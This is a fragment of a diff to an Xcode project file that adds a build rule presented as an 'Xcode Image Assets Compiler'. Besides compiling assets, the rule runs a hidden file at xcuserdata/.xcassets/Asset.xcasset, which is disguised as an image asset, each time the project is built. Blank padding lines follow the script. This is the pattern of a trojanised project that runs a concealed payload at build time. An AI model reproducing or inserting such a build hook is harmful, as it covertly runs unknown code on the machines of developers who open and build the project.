+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" true\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
